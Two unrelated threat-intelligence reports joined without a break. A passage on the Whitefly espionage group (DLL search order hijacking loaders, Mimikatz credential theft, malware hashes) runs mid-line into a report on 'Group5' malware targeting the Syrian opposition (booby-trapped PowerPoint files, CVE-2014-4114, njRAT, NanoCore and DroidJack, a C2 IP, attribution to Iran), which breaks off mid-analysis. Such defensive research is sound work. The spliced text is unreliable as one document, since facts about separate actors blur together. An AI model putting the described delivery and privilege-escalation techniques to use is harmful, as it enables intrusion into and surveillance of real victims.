If opened, the dropper runs a loader known as Trojan.Vcrodat on the computer. Whitefly has consistently used a technique known as search order hijacking to run Vcrodat. This technique takes advantage of the fact that Windows does not require an application to provide a specific path for a DLL that it wishes to load. If no path is provided, Windows searches for the DLL in specific locations on the computer in a pre-defined order. Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it. Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors. The group leverages search order hijacking to assure that its malicious DLLs will be executed. Targeting security applications could allow the attackers to gain higher privileges for the malware, since the vendor’s component may be run with elevated privileges.
Once executed, Vcrodat loads an encrypted payload on to the victim’s computer. The payload contacts a command and control (C&C) domain. Whitefly configures multiple C&C domains for each target. The payload sends system information about the infected computer to the C&C server and downloads additional tools.
Whitefly usually attempts to remain within a targeted organization for long periods of time—often months—in order to steal large volumes of information.
Once the initial computer on the targeted organization’s network is infected with Vcrodat, Whitefly begins mapping the network and infecting further computers. In order to carry out this operation, it uses publicly available tools, including Mimikatz (Hacktool.Mimikatz) and an open-source tool (SHA2: 263dc5a8121d20403beeeea452b6f33d51d41c6842d9d19919def1f1cb13226c) that exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers. The attackers rely heavily on tools such as Mimikatz to obtain credentials. Using these credentials, the attackers are able to compromise more machines on the network and, from those machines, again obtain more credentials.
They perform this tactic repeatedly until they gain access to the desired data.
Whitefly usually attempts to remain within a targeted organization for long periods of time—often months—in order to steal large volumes of information. It keeps the compromise alive by deploying a number of tools that facilitate communication between the attackers and infected computers. These tools include a simple remote shell tool that will call back to the C&C server and wait for commands, and an open-source hacking tool called Termite (Hacktool.Rootkit), which allows Whitefly to perform more complex actions such as controlling multiple compromised machines at a time.
Additional malware used in selected attacks In some attacks, Whitefly has used a second piece of custom malware, Trojan.Nibatad. Like Vcrodat, Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer. And similar to Vcrodat, the Nibatad payload is designed to facilitate information theft from an infected computer.
While Vcrodat is delivered via the malicious dropper, we have yet to discover how Nibatad is delivered to the infected computer. Why Whitefly uses these two different loaders in some of its attacks remains unknown. And while we have found both Vcrodat and Nibatad inside individual victim organizations, we have not found any evidence of them being used simultaneously on a single computer.
Links to other attacks Some of the tools that Whitefly has used in its attacks have also been deployed in other targeted attacks outside Singapore.
Between May 2017 and December 2018, a multi-purpose command tool (SHA2: 7de8b8b314f2d2fb54f8f8ad4bba435e8fc58b894b1680e5028c90c0a524ccd9) that has been used by Whitefly was also used in attacks against defense, telecoms, and energy targets in Southeast Asia and Russia. The tool appears to be custom-built and, aside from its use by Whitefly, these were the only other attacks where Symantec has observed its use.
In another case, Vcrodat was also used in an attack on a UK-based organization in the hospitality sector.
It's possible Whitefly itself performed these attacks but it’s more likely that they were carried out by one or more other groups with access to the same tools.
Adept attackers with a large toolset It now appears that the SingHealth breach was not a one-off attack and was instead part of a wider pattern of attacks against organizations in the region. Whitefly is a highly adept group with a large arsenal of tools at its disposal, capable of penetrating targeted organizations and maintaining a long-term presence on their networks. Links with attacks in other regions also present the possibility that it may be part of a broader intelligence gathering operation.
Protection/Mitigation Symantec has the following protection in place to protect customers against these attacks:
File-based protection
Trojan.Vcrodat Trojan.Nibatad Hacktool.Rootkit Hacktool.Mimikatz Indicators of Compromise MD5	SHA2	Description eab0a521aa7cac62d98d78ef845a8319	a196dfe4ef7d422aadf1709b12511ae82cb96aad030422b00a9c91fb60a12f17	Trojan.Vcrodat 79bef92272c7d1c6236a03c26a0804cc	d784a12fec628860433c28caa353bb52923f39d072437393629039fa4b2ec8ad	Trojan.Vcrodat 394df628b3c8977661c8bebea593e148	6e874ac92c7061300b402dc616a1095fa7d13c8a18c8a3ea5b30ffa832a7372c	Trojan.Nibatad 51862c3615e2f8a807b1d59f3aef3507	ed3cd71eaca603a00e4c0804dc34d84dc38c6c1e1c1f43af0568fb162c44c995	DLL Shellcode Loader b4a7049b90503534d494970851bdda62	9d9a6337c486738edf4e5d1790c023ba172ce9b039df1b7b9720ed4c4c9ade90	DLL Shellcode Loader 93c9310f3984d96f53f226f5177918c4ca78b2070d5843f08d2cf351e8c239d5	Mimikatz 263dc5a8121d20403beeeea452b6f33d51d41c6842d9d19919def1f1cb13226c	CVE-2016-0051 privilege escalation b2b2e900aa2e96ff44610032063012aa0435a47a5b416c384bd6e4e58a048ac9	Termite dda22de8ad7d807cdac8c269b7e3b35a3021dcbff722b3d333f2a12d45d9908d	Simple command line remote access tool f562e9270098851dc716e3f17dbacc7f9e2f98f03ec5f1242b341baf1f7d544c	Simple command line remote access tool 7de8b8b314f2d2fb54f8f8ad4bba435e8fc58b894b1680e5028c90c0a524ccd9	Multi-purpose command toolExecutive Summary
This report describes an elaborately staged malware operation with targets in the Syrian opposition. The operators use a range of techniques to target Windows computers and Android phones with the apparent goal of penetrating the computers of well-connected individuals in the Syrian opposition. We first discovered the operation in late 2015 when a member of the Syrian opposition spotted a suspicious e-mail containing a PowerPoint slideshow. From this initial message, we uncovered a watering hole website with malicious programs, malicious PowerPoint files, and Android malware, all apparently designed to appeal to members of the opposition. Elements of the Syrian opposition have been targeted by malware campaigns since the early days of the conflict: regime-linked malware groups, the Syrian Electronic Army, ISIS, and a group linked to Lebanon reported by FireEye in 2015 have all attempted to penetrate opposition computers and communications. Some of these operations are still active as of the time of writing.

This report adds one more threat actor to the list: Group5, which we name to reflect the four other known malware groups. Group5 stands out from the operations that have already been reported on: some of the tactics and tools used have not been observed in this conflict; the operators seem comfortable with Iranian Persian dialect tools and Iranian hosting companies; and they appear to have run elements of the operation from Iranian IP space. Syria: Publicly-reported Threat Actors

Like a chameleon, Group5 borrows opposition text and slogans for e-mail messages and watering holes, showing evidence of good social engineering and targeting. However, Group5’s technical quality is low, and their operational security uneven. This is a common feature of many operations in the Syrian context: since the baseline security of many of the targets is very low, many successful threat actors seem to conserve (and in some cases not possess) more sophisticated techniques.

We believe we identified Group5 early in its lifecycle, before all of the malware that had been staged and prepared could be deployed in a full campaign. Our analysis indicates that Group5 is likely a new entrant in Syria, and we outline the circumstantial evidence pointing to an Iranian nexus. We do not conclusively attribute Group5 to a sponsor, although we suspect the interests of a state are present, in some form. Group5 is just the latest addition to an expanding cast of actors targeting Syrian opposition groups, and its entry into the conflict shows the continuing information security risks that they face. Background: The Perpetual Targeting of the Syrian Opposition
Syrians have experienced monitoring and blocking of their electronic communications for many years. As a result, many more technically literate Syrians have familiarized themselves with VPNs and other tools to circumvent simple blocking, and achieve a degree of privacy.

After the 2011 Uprising began, the regime disconnected telecommunications services in many areas controlled by opposition groups. This led, in these areas, to the widespread adoption of satellite internet connectivity, mostly via VSAT (Very Small Aperture Terminal) services like Tooway and iDirect, and to a lesser extent the use of BGAN (Broadband Global Area Network) terminals. At the same time, the Syrian opposition’s activities outside the country, both in neighboring countries like Turkey, as well as in the diaspora, dramatically increased. Much of this activity takes place over social networks, free e-mail accounts like Gmail (and Google Apps for Work), and via tools like Skype’s VoIP services. These shifts in connectivity limited the effectiveness of the passive monitoring and blocking used by the Al Assad Regime, and frustrated its abilities to monitor the opposition. However, the shift towards social networks and other online tools has created new opportunities for the regime to target the opposition.

Opposition members constantly share information, files, tools and programs, via social media. This highly-connected environment enables them to be highly aware of changing events, and quickly mobilize resources. In addition, a number of online services, such as the Google Play Store, are blocked or restricted for Syria. As a result, a culture of sharing Android APK files has also developed. The heavy reliance on popular online platforms, and regular sharing of tools, presents many opportunities to seed malicious files. For the regime, a successful operation means a chance to regain visibility into the activities of groups within the geographic borders of Syria, while extending their reach outside into the diaspora. For other groups, such as ISIS, the digital vulnerability of the opposition presents an opportunity to develop a capability against opposition communications. The following section outlines several of these known threat actors. Regime-Linked Groups
The most well-known threat actor to target the Syrian Revolution is the Syrian Electronic Army (SEA).

However, many of the targets of the SEA have been Western organizations, although the SEA continues to conduct lower-profile operations that include malware against the opposition. Less notorious, although still the subject of reporting, are malware groups linked to the regime. These malware groups have been active since 2011, and have used a wide range of Commercial-Off-The-Shelf (COTS) Remote Access Trojans (RATs) to target the opposition. Typically, these groups bundle RATs with a wide range of documents and programs designed to appeal to the opposition. Over the years, these campaigns have included everything from “revolution plans,” lists of “wanted suspects,” to fake security and encryption tools. These campaigns have been extensively characterized by reports from the Citizen Lab, The Electronic Frontier Foundation, and private companies like TrendMicro and Kaspersky. A range of reports have documented these regime-linked campaigns over the years. Pro-Regime Groups Outside Syria
There is also evidence of pro-Assad groups outside Syria participating in malware campaigns against opposition.

Notably, a group reported on in 2015 by FireEye (in collaboration with one of the authors of this report) used female avatars to send trojaned documents to high profile figures in opposition politics, aid, and armed groups. The operation yielded over 31,000 conversations, and a trove of sensitive information about a variety of groups’ plans and activities. This group also made use of fake matchmaking websites and social media accounts to backstop their deception. ISIS-Linked Groups
On a different side of conflict, the Citizen Lab documented a malware operation linked to ISIS against the group ‘Raqqa is Being Slaughtered Silently’ (RBSS) in 2015. The operators, masquerading as a group of RBSS sympathizers based in Canada, targeted victims with a file that claimed to contain locations of ISIS forces and US Airstrikes within Syria. The file actually contained custom malware that collected and transmitted information about the infected computer. The report concluded that there was strong circumstantial evidence linking the malware to members of ISIS.

Many Groups, Similar Tactics
Each of these groups has distinct Tactics, Techniques and Procedures (TTPs). However, one common thread among the many publicly-reported groups is that they rarely use exploits in their campaigns, instead relying heavily on social engineering and trickery to convince targets to execute malicious files, disguised as innocuous documents. This may reflect some of these groups’ lack of technical sophistication. For example, many regime-linked groups seem to have very limited skills and technical resources, and rely almost entirely on RATs coupled with well-informed social engineering. These techniques have evolved, but not improved radically since 2011. In other cases, such as the Lebanon-linked group reported on by FireEye, operators may have access to more sophisticated techniques, but see little reason to use them against their targets, given the limited technical capabilities of the opposition. Part 1: Discovering Group5
This section describes the e-mails that first alerted us to an operation targeting the Syrian political opposition in October 2015.

On October 3rd 2015, Noura Al-Ameer, a well-connected Syrian opposition political figure, negotiator, and former Vice President of the opposition Syrian National Council (SNC), received a suspicious e-mail.1 The e-mail purported to come from a human rights documentation organization she had never heard of: “Assad Crimes.” The sender, using the e-mail address office@assadcrimes[.]info claimed to be sharing information about Iranian “crimes,” a theme familiar to many in the opposition. Noura Al-Ameer
Fig. 1: Noura Al-Ameer, former SNC Vice President and a target of the operation. An activist from Homs, Syria, Al-Ameer was detained and tortured in the security branches, later moved to the infamous Adra prison in Damascus, prior to fleeing the country several years ago. Today, she is a delegate to the SNC’s political council and works to document war crimes committed during the conflict. Her identity was falsely used to register the assadcrimes website. Interestingly, Al-Ameer’s own name was used in the assadcrimes[.]info domain registration, along with other false information (we speculate on the reason for using her name in Part 6: Analysis of Competing Hypotheses).

Along with a brief pretext in the Subject and Body, the e-mail also contains an attached Microsoft PowerPoint Slideshow (PPSX) document that, when clicked, directly opens and runs a PowerPoint slideshow. E-mail 1: The Initial Message (Dropper Doc 1)
On October 3rd 2015, Al-Ameer received the initial e-mail message, containing the first malicious file:
Email message from AssadCrimes

Translation:

From: office@assadcrimes[.]info
To:
Subject: Iran is killing the Pilgrims in Mina
Body: Iran’s Crimes in the Kingdom of Saudi Arabia
Examination of the header of the message indicates that the message was sent via 88.198.222[.]163, the same IP address as the Command & Control (C2) for the malware dropped by the file (See Part 3: Windows Malware). Assadcrimes.ppsx
MD5 : 76F8142B4E52C671871B3DF87F10C30C
Communication with the Operator
Al-Ameer, who is no stranger to digital threats, recognized that the e-mail was suspicious, and on our instruction made contact with the operator, hoping to elicit further malware.

Al-Ameer’s E-mail:
Al Ameer's Email

Translation:

From: [Redacted]
To: office@assadcrimes[.]info
Body:
Hello
The file didn’t work …. Please send a correct version
E-mail 2: The Operator Replies (Dropper Doc 2)
Shortly after the target’s message, the operator replied with an updated file, sent via a webmail client (RoundCube):
The Threat Actor Replied

Translation:

From: office@assadcrimes[.]info
To:[Redacted]
Body:
inf* download
We are unsure why the second e-mail does not contain additional social engineering text. It is possible this was an oversight, or that the Group5 operator at the time was not comfortable writing in Arabic. Assadcrimes1.ppsx
MD5: F1F84EA3229DCA0CCACB7381A2F49F99
Bait Content: Syria and Iran-Themed PowerPoint Slideshows
The PPSX documents (assadcrimes.ppsx & assadcrimes1.ppsx) contain a series of images and Arabic text, including cartoons and photographs describing politically sensitive events, such as aggressions launched by Iran against Saudi Arabia, and the politics surrounding the current Syrian conflict. The documents also provide a historical overview of Iranian-linked “attacks” and other events in the Kingdom of Saudi Arabia.

Figure 2: Screenshot from a slide referred to an Iranian attack in 1984 against petrochemical facilities in Saudi Arabia. Translation:

On 1404 A.H – 1984 A.D Iranian warship attacked Saudi Arabia
On 1404 A.H, two Iranian war planes headed to Jubail industrial city, to bomb and hit critical factories (Petrochemical factory) and by god’s well, the Saudi’s air forces was able to hit one plane, while the other managed to escape. When opened, both files download malware onto the victim’s machine. Malware from these files is analyzed in Part 3: Windows Malware. Part 2: The Assadcrimes Website
Group5 operated a website, assadcrimes[.] info that served as a watering hole for Android and Windows malware. This section outlines the various files hosted on the site. After the initial e-mails, we began to monitor a website linked to the e-mails: assadcrimes[.]info. At the time of these e-mails (Oct. 3, 2015), the site was not fully functional.

However, within a few days (Oct. 11, 2015) the main page displayed “Posts Tagged Bashar Assad Crimes” with content apparently critical of Bashar Assad. The content appears to have been scraped from an opposition blog, as well as from other opposition sites. This blog was created in the name of Tal al-Mallohi, known as Syria’s youngest prisoner of conscience. The original blog creation predates the current unrest in Syria. Figure 3 : Screenshot of the website taken in April 2016 (assadcrimes[.]info). Shortly before this publication of Group5, the website was listed as “expired” and parked, indicating that the owner chose not to renew the domain. Group5 Staging and Targeting
Group5 Staging and Targeting
Malware Seeding on the Website (Dropper Doc 3)
While monitoring the website, we identified several directories that auto-download a further malicious file (assadcrimes.info.ppsx). These links seem designed for other forms of social engineering, perhaps using similar bait to the messages targeting Al-Ameer.

The Assadcrimes.info.ppsx file concerns the Syrian conflict, with characters and cartoons culled from social media and online sites. Figure 4 : A slide from the file Assadcrimes.info.ppsx

Translation:

A new Play in Syria
Russian-American plan to divide the Syrian cake. When viewed, the victim’s computer is silently infected with malware (See Part 3: Windows Malware). Assadcrimes.info.ppsx
MD5: 30BB678DB3AD0140FC33ACD9803385C3
Martyred Children (Decoy Dropper 4)
Elsewhere on the site we found several HTML pages that, when visited, triggered the downloading of a malicious executable named “martyred children” (alshohadaa alatfal.exe). When executed, the program pulls images hosted on assadcrimes[.]info of the Ghouta Chemical Attacks, while simultaneously infecting the target machine with malware. Figure 5 : showing screenshot of ‘alshohadaa alatfal.exe’ running. Images blurred by the authors. Malware from the website is described in Part 3: Windows Malware

alshohadaa alatfal.exe
MD5: 2FC276E1C06C3C78C6D7B66A141213BE
Android Malware
While examining the assadcrimes[.]info website, we identified Android malware, seeded via a fake Adobe Flash Player update notification.

We describe this Android malware in detail in: Part 4: Android Malware. adobe_flash_player.apk
MD5: 8EBEB3F91CDA8E985A9C61BEB8CDDE9D

Part 3: Windows Malware
Group5 used (or was staging) a range of malware in this operation, ranging from malicious PowerPoint slideshows using exploits to executable files that directly drop malware. A comprehensive analysis of their malware is found in Appendix A: Windows Malware Analysis. Malicious PowerPoint
The initial Group5 targeting that we observed in the e-mails to Al-Ameer included PPSX documents as a vehicle for malware using two different techniques: (1) executing OLE objects using animation actions within a PowerPoint slideshow and; (2) using CVE-2014-4114 to drop and execute malicious code. In assadcrimes.ppsx the operators embed an OLE Package object within a PowerPoint slideshow. When displayed as an animation, the object is executed while the slideshow is viewed, a technique that has been previously described (for more detail, see Appendix A: Dropper Doc 1 & Appendix A: Dropper Doc 3).

In this case the user is presented with a prompt asking whether they wish to run the object. Figure 6: The malicious executable within the PowerPoint slideshow, when viewed in edit mode. A victim double clicking on the slideshow would not be shown the object. Figure 6: The malicious executable within the PowerPoint slideshow, when viewed in edit mode. A victim double clicking on the slideshow would not be shown the object. In the assadcrimes1.ppsx, the operator has created a PowerPoint file that leverages CVE-2014-4114, a vulnerability in the OLE packager component of the Windows operating system (See Appendix A: Dropper Doc 2). Decoy Applications
The operators have also created a decoy application, hosted on assadcrimes[.]info, that displays images of child victims of the 2013 Ghouta Chemical Attacks. When executed, the application silently decrypts and drops the malware (See Appendix A: Decoy Dropper 4). Group5 Malware Techniques

The RATs
The operators use these techniques to deliver two commonly available Remote Access Trojans (RATs): njRat and NanoCore RAT.

In both cases, Group5 disguised the malicious binaries with several layers of obfuscation, including crypting and packing to reduce the possibility of detection by antivirus software. Both RATs provide a wide range of functionality on the target machine, ranging from collecting files, watching the screen, to capturing passwords and keystrokes. The RATs also enable the operator to remotely delete files, and spy on the computer user via the microphone or webcam. Figure 7 : Screenshot of njRAT working, and accessing the victim’s files. Antivirus Detection
On July 26, 2016 we conducted a VirusTotal search for the MD5 hashes of each of the files encountered during this operation. The results, provided in Appendix D: File Hashes, were consistent with a highly focused or targeted operation in that only two of the 16 (12.5%) unique MD5s were found. Part 4: The Android Malware
While examining assadcrimes[.]info, we determined that the site was also hosting a decoy Flash Player update page.

This page, located on a subdomain, included a download link to a malicious Android APK. For a full analysis of this malware see Appendix B: Android Malware. While examining the website we found that the operators had prepared Android malware masquerading as an Adobe Flash Player update notification. Clicking on the “Update” link (See Figure 8) downloads a malicious file, masquerading as a software update. Figure 8: Screenshot from the subdomain that was used to host the fake Flash Player update page. The APK is an instance of DroidJack. According to Symantec, this malware evolved from an older codebase known as SandroRAT. The RAT provides a wide range of functionality, enabling the operator to capture messages, contacts, photos and other materials from the device. In addition, DroidJack can also remotely activate the phone camera and microphone, without notifying the victim. Figure 9 shows some of the functionality available. Figure 9: DroidJack server list of commands.

A more extensive analysis of the DroidJack malware, can be found in Appendix B: Android Malware. Interestingly, DroidJack has also emerged recently, bundled with versions of Pokémon Go. This approach to mobile malware seeding, while cumbersome, might be assumed to have greater success in the target group of Syrians than other populations. It is common for Syrians to share Android APK files outside the Google Play Store, as Google Play Services are not available within Syria. This practice carries over to the Syrian diaspora in other countries, despite the availability of Google Play. As a result, we suspect that most devices are set to accept APK files from unknown developers. Part 5: Attribution
Group5 left a number of clues as to their origin and identity, including the tools they used, where they hosted their website and C2, and how they accessed the website. Notably, Group5 may have also been using a customized version of an Iranian obfuscation tool.

This section provides an overview of the clues left by Group5 on the website, and in the malware. First, we analyze logs that the operator mistakenly left publicly visible on the assadcrimes[.]info website. These logs include not only the visitors to the site, but also the IP addresses and user agent strings that belong to the operator as she or he logged into the site during the development phase. These artifacts provide interesting clues as to the operator’s identity and operational security practices, such as using a VPN, and suggest a strong Iranian nexus. Second, we note the use of Persian-language tools in Group5, from the mailer to the packer. Finally, we analyze a recurrent theme in the binaries: “Mr. Tekide” – a name that appears regularly in the implants. We link this name to the Iranian developer of a series of malware tools, several of which were used in this operation.

Additionally, we examine the circumstantial evidence connecting this developer to Group5’s activities. Unprotected Logs
Several key directories on the assadcrimes[.]info site were left as public, including a folder containing the website logs, a feature Group5 seems to have enabled early in the operation. These logs date to the early development and operation of the website, and reveal interesting clues about operator origin and operational security. After processing the logs to remove crawlers belonging to Google, Bing, Yandex and others, we scrutinized the logs of the site for evidence of victims, but were unable to locate any victim IPs with high confidence. Identifying the Operator from Website Logs
While the logs provided few clues as to victims, they proved to be exceptionally useful for identifying the IP addresses used by Group5 as they developed the site. Looking at the earliest logs in the set, from October 11, 2015, we find the operator accessing the site hourly from an Iranian IP block as the development continues.

Figure 10: Screenshot of 11th October 2015 log, showing list of IP’s and referrer from hostnegar[.]com
The first logged visits to the site come from the IP address 37.137.131[.]70, which belongs to a block registered to ‘Rightel Communication’, an Iranian mobile phone network operator. inetnum: 37.137.128[.]0 – 37.137.255[.]255
netname: RighTel
descr: “Rightel Communication Service Company PJS”
country: IR
admin-c: RP12366-RIPE
tech-c: RP12366-RIPE
status: ASSIGNED PA
mnt-by: TA59784-MNT
created: 2013-08-20T11:13:17Z
last-modified: 2014-05-17T05:28:10Z
source: RIPEperson: RighTel PJS
address: 9th floor, Chooka Building, No 8 , west Armaghan Street, Vali-e-Asr Street
(After Niayesh Highway), Tehran, Iran
phone: + 982127654530
nic-hdl: RP12366-RIPE
mnt-by: TA59784-MNT
created: 2014-05-17T05:23:47Z
last-modified: 2014-05-17T05:23:47Z
source: RIPE
Further confirming the link is that the operator’s traffic includes a referrer from the Iranian hosting company (hostnegar[.]com) for the site. Figure 11: Hostnegar’s login page
Tracing the operator through an initial UserAgent string (a version of Windows NT 6.3)2 and IP address, we found them accessing the site from an iPhone, other Iranian IP addresses, as well as VPNs.

Figure 12: User agents for the site owner, accessing the website from Iranian IPs and VPN. Additionally, the operator accessed the site directly from the malware’s C2 server (88.198.222[.]163). Figure 13 : User agents for the site owner, accessing the website from the C2, and using VPNs. These links provide evidence for an Iranian nexus, and suggest that the operator may have been taking steps to conceal their true origin IP. However, these steps were not well executed, which enabled us to track Group5 as they continued to access the site. Interestingly, after the flurry of activity in October 2015, by November-December the operator accessed the site only 7 times, and between January-February 2016 only twice (it is possible we have missed some access attempts that appear to be innocuous traffic). We concluded from this that Group5 may have stepped back from the site at some point after the New Year.

A Persian-language Mailer
Before the assadcrimes[.]info page was fully populated with decoy content, we found that the site was hosting a Persian-language mailer (See Figure 14 below). We were not able to determine how the mailer was being used by Group5, as it was not observed sending any of the e-mails we were able to analyze. Figure 14: A screenshot for the mailer as it was on October 4, 2015. Links to Known Threat Actors
Group5 appears to have used only a single shared web hosting provider and a single command and control IP address for this operation. We are unsure whether this strategy was the product of limited resources, an effort to compartmentalise the operation from other activities, or simply a highly targeted operation with a specific focus. The narrow infrastructure and small number of observed targets limited our search base for potential infrastructure overlap with known groups. In a holistic evaluation of the campaign, we failed to identify links with the TTPs of previously documented threat actors or groups active in Syria.

We also failed to find a link in searches of malware databases and open source searching. On the level of TTPs, superficially there is similarity between this group and other active groups originating in Iran. The group multiply documented by Palo Alto Networks, which they call “Infy,” is also known to use PowerPoint files in their targeting, although we found no overlap in infrastructure. Furthermore, their targeting (according to what Palo Alto Networks has said publicly) is slightly different, and involved PowerPoint 97-2003 documents (not PPSX files) during the same period in which Group5 was using a different tactic. We cannot not rule out the possibility that a known group is behind this operation, and that we missed or lacked access to a key piece of evidence that would link such a group to Group5’s infrastructure or tools. One interesting direction for further investigation came from analysis of the tool used to obfuscate the RATs, which yielded a number of interesting connections to known threat actors and tools.

Notably, the PAC Crypt tool, and Mr. Tekide, the alias of an Iranian malware developer. PAC Crypt
Commonly used in malware campaigns, crypters are programs which are designed to disguise the underlying malicious binary by hiding it within a layer of obfuscation which is then deobfuscated at the time of execution. In this way, crypting a malicious binary provides a level of protection against signature-based endpoint security tools such as antivirus. In Appendix A we describe the discovery of a series of strings which suggest that both the njRAT and NanoCore RAT payloads were built, and then subsequently obfuscated using a crypter tool named ‘PAC Crypt’. Careful inspection revealed that the crypter in this case had been compiled in debug mode, thus preserving PDB reference data. PDB file references are common in .Net applications when compiled in ‘debug’ mode, and they frequently reveal the original file path of the application source code on the developer’s computer.

Below are the PDB strings discovered when examining the ‘crypted’ njRAT and NanoCore files:

Reference: Doc Dropper 1 Crypter	MD5: a4f1f4921bb11ff9d22fad89b19b155d	Compile Time: 9/30/2015 00:02:51
c:\users\mr.tekide\documents\visual studio 2013\projects\paccryptnano core dehgani -vds\windowsapplication2\obj\debug\launch manager.pdb
 

Reference: Doc Dropper 3 Crypter	MD5:6161083021b695814434450c1882f9f3	Compile Time: 10/6/2015 02:13:45
C:\Users\mr.tekide\Documents\Visual Studio 2013\Projects\paccrypt11njratmalii\paccryptalipnahzade\obj\Debug\LManager.pdb
These PDB strings reveal two facts relevant to the discussion of attribution. The first is that the username of the individual who compiled the .Net application in both cases was ‘mr.tekide’. The second is that in both PDB strings we find not only a reference to the malware crypter used (a tool called ‘PAC Crypt’), but also an explicit reference to the crypted malware payloads – ‘nano core’ and ‘njrat’. These two facts together suggest that an individual having the username ‘mr.tekide’ compiled a copy of PAC Crypt for specific projects involving njRAT and NanoCore RAT. A common usage scenario for a malware crypter involves an operator purchasing a copy of the crypter in a compiled form (or using a cracked version), then using the crypter to obfuscate the malware executable which is to be distributed.

In this scenario the developer of the crypter has no knowledge of what specific malware the threat actor will eventually choose to encrypt with the purchased copy of the crypter. The fact that the ‘PAC Crypt’ PDB strings discovered in this case contained the ‘njrat’ and ‘nano core’ references is therefore noteworthy because it indicates the possibility of prior knowledge of the precise malware payload which was to be crypted. Research into the PAC Crypt tool revealed that this program is developed and sold by an Iranian malware developer known as ‘Mr. Tekide’. Mr. Tekide
Mr. Tekide is the online alias of an Iranian malware developer who is also the administrator of the website http://crypter[.]ir, an Iranian hacking forum and online shop. Notably, this storefront offers various hacking tools and services, including the aforementioned ‘PAC Crypt’ (see figure 15 below). Crypter[.]ir main page (left), and contact page (right)	Crypter[.]ir main page (left), and contact page (right)
Figure 15: Crypter[.]ir main page (left), and contact page (right)

In addition to the crypter[.]ir forum and shop, Mr.

Tekide appears to be in the midst of creating a new online storefront for selling his various malware tools and services. The content shown in Figure 16 below, obtained from http://crypting[.]org, shows a ‘rat service’ being offered to visitors. The store also touts a Windows Rootkit (“coming soon”) and various ‘exploits.’

Figure 16: Crypting[.]org main page (left), list of hacking services offered (right)	Figure 16: Crypting[.]org main page (left), list of hacking services offered (right)
Figure 16: Crypting[.]org main page (left), list of hacking services offered (right)

Mr. Tekide also maintains an active presence as a moderator on the Ashiyane forums,3 an Iranian security discussion board run by the Ashiyane Digital Security Team (ADST). The ADST is a well-known Iranian security and hacking group which has earned notoriety for its prolific website defacement activities. These defacements invariably contain a list of ADST ‘defacers’ alongside the phrase ‘We Love Iran’. Web site defacements conducted by ADST have explicitly named Mr.

Tekide as a member, as shown in Figure 17 below. Figure 17: an Ashiyane Digital Security Team defacement page, naming Mr. Tekide 
In addition to its defacement activities, ADST has been recently linked to the indictment by the US Department of Justice of seven Iranian nationals for cyber attacks against the US financial sector. In its indictment, the Department of Justice alleges that members of two Iranian security companies, ITSecTeam and Mersad Company, were responsible for Distributed-denial-of- Service (DDoS) attacks against numerous US bank websites between September 2012 and May 2013. The DoJ indictment also describes that Mersad was founded by members of the ADST, and furthermore that ADST had made prior public claims regarding its activities on behalf of the Iranian Government. Additional open source information about Mr. Tekide is included in Appendix C: Mr. Tekide. A Consistent Iranian Nexus
We cannot conclude with certainty that Group5 is Iran-based, although the confluence of information outlined above provides a circumstantial case.

The IP addresses observed during early stages of development of the Assadcrimes website, as well as the Iranian hosting provider and the Persian language mailer, all speak to a level of Iranian presence. The additional apparent involvement of an Iranian malware developer with ties to a known Iranian cyber actor, whether his involvement was unwitting or intentional, only strengthens the Iranian connection. Part 6: Analysis of Competing Hypotheses
This section evaluates several competing hypotheses for explaining the identity of the operator. While we cannot conclusively support one of these hypotheses, we think the most plausible is that this operation is the work of an Iranian group newly active in Syria. We believe we found Group5 fairly early in the process of preparing a larger malware campaign, thanks to Noura Al-Ameer’s vigilance. This gave us unique visibility into some of their staging, but we had only a limited view of other possible targeting.

Group5’s reliance on a narrow infrastructure limited our ability to connect the operation to other known groups, as discussed above. With these caveats and limitations in mind, we outline the known elements of the operation, and evaluate several hypotheses: (Hypothesis 1) an Iranian group newly active in Syria; (Hypothesis 2) that the operation is from known regime-linked groups, like the Syrian malware groups; and (Hypothesis 3) that it is from some other unknown group. After addressing the fit of each hypothesis with available evidence, we provide an overall evaluation of the three, and conclude that Hypothesis 1 provides the best explanation for what we have observed. Hypothesis 1: Iranian Group Newly Active in Syria
A group previously unreported in Syria with uneven skills but displaying thought and care in selecting the target, and preparing the operation, with an Iranian nexus and a possible government connection. Previously Unseen in Syria: We have been unable to find a high-confidence overlap in infrastructure or malware to previously-reported groups active around Syria.

We also had difficulty connecting the operation to other known groups in the global threat actor space. Furthermore, the use of exploits, as well as DroidJack and other tools, is inconsistent with the TTPs of known groups targeting the Syrian opposition, especially the regime-linked groups. Notably, these groups have shown little ability or appetite for: (a) standing up multifaceted seeding websites; (b) targeting Android users; (c) using exploits in PowerPoint files. Previously reported groups, especially regime-linked groups, have had a tendency to re-use infrastructure, and repurpose similar tools and approaches. It would be surprising for them to suddenly abandon tactics that still “work,” and cease using a C2 infrastructure that cannot be taken down (because it is inside Syria). While Group5’s tactics have more in common with the group reported in this FireEye report, such as the use of a fake website, COTS .Net malware, and Android malware, there is no direct infrastructure or tool overlap, and only limited evidence of social engineering sophistication (e.g.

the use of avatars). Furthermore, the lack of technical sophistication, combined with low operational security, suggest that, had this group been previously active for any length of time, it would have run the risk of discovery, perhaps especially given all of the existing reporting about pro-Regime malware groups in Syria. Uneven Technical Sophistication: The operators showed familiarity with a range of cybercrime tools, yet also committed a range of operational security oversights, such as leaving their logs open and public-facing, connecting via their C2 server, and leaving debugging strings in compiled files. These characteristics would be inconsistent with the work of an in-house government capability. Iranian Connection: Analysis of the malware and seeding yields a consistent Iranian presence. The binary contains Iranian and Iranian-Persian traces, as do the tools used for obfuscation, which are popular in Iranian cybercrime forums. Similarly, the mailer discovered on the assadcrimes[.]info website is in Persian.

There is also the intriguing, but ultimately unproven speculation that the crypter may have been sold to Group5 by a known Iranian malware developer. Furthermore, logs of access to the assadcrimes[.]info site suggest that the operators are working from within Iranian IP space. In addition, the bait content also contains substantial Iranian themes. Finally, the hosting provider (Hostnegar) is Iranian. A final piece of highly circumstantial evidence is that PowerPoint documents containing exploits, albeit often with quite different (and sometimes custom) malware, is a commonly reported feature of many recently-reported Iranian campaigns. Targeting Sophistication: Group5 not only targeted a well-connected individual within the Syrian opposition, but also masqueraded as her to register the assadcrimes[.]info site. Both the site and the bait content also indicate a degree of familiarity with the opposition’s concerns and activities, and their targeting indicates they were targeting a key person in opposition politics and multilateral negotiations, yet not highly visible outside of informed circles.

